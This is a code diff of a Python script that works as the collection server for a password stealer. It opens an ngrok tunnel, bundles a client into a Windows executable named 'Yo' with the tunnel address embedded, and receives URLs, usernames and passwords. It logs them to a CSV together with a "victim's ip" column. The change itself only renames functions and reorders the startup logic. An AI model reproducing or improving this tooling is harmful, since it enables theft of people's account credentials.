@@ -1,7 +1,7 @@
 import socket, csv, os
 from pyngrok import conf, ngrok
 
-def NgrokServer():
+def ngrok_server():
     with open("auth_token.txt", mode="r") as file:
         conf.get_default().auth_token = file.readline()
     try:      
@@ -10,19 +10,16 @@ def NgrokServer():
     except e:
         print(e)
         print("Sometimes this happens when you run a program in a virtual machine so run the program on a real machine")
-
     with open("ip.txt", mode="w") as file:
         file.write(ip)
 
-def Server():
+def server():
     host = '127.0.0.1' 
     port = 8796
-
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.bind((host, port))
         s.listen()
         print(f"The server is listening on the port: {port}...")
-
         while True:
             conn, addr = s.accept()
             print(f"Connection established with {addr}")
@@ -41,17 +38,14 @@ def Server():
                     url, username, password = data.split(' ')
                     conn.send("OK!".encode())
                     writer.writerow({'url': url, 'username': username, 'password': password, "victim's ip": publicIP})
-
             conn.close()
             break
-
 
 if __name__ == "__main__":
     if not os.path.exists("auth_token.txt"):
         with open("auth_token.txt", mode="w") as file:
             file.write(input("Please enter your ngrok auth token: "))
         print("OK!")
-
     print("|-----------------------------------------------------------------------------------------|")
     print("|                                        Choose option!                                   |")
     print("| 0-Just start server | 1-Create exe file and start server (Only pick on windows machine) |")
@@ -68,13 +62,10 @@ if __name__ == "__main__":
             print("Only numbers")
             print(e)
 
-    if zm == 0:
-        NgrokServer()
-        Server()
+    ngrok_server()
     if zm == 1:
-        NgrokServer()
         os.system("pyinstaller --noconfirm --onefile --console --name Yo --add-data ip.txt;. client.py")
-        print("---------------------------------------", end="\nCheck 'dist' dir for exe file\n")
-        Server()
+    print("---------------------------------------\nCheck 'dist' dir for exe file\n")
+    server()    
 
 
